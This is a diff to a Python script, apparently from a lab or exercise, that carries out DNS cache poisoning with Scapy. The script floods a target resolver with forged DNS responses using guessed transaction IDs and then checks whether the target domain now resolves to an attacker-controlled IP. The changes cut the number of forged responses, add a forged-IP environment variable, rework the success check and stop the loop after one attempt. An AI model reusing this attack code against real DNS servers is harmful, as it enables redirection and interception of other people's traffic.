@@ -20,6 +20,7 @@ known_ns_ip = "216.69.185.38"
 
 # Malicious DNS server
 attacker_dns_ip = os.environ['ATK_SERVER_IP']
+expected_ip = os.environ['ATK_FORGED_IP']
 
 
 def initial_request(domain, ip, port):
@@ -73,7 +74,7 @@ while True:
 
     packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]
 
-    response_amount = 500
+    response_amount = 50
     r = random.randint(0, (2 ** 16) - response_amount + 1)
     for i in range(r, r + response_amount):
         packet_list.append(
@@ -90,8 +91,9 @@ while True:
     dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=target_domain)), verbose=0)
 
     try:
-        if dns_response[DNS].an.rdata == attacker_dns_ip:
+        if dns_response[DNS].an.rdata == expected_ip:
             print("Successfully poisoned the zone of {}".format(target_domain_base))
             break
     except:
         print("Poisoning failed")
+    break
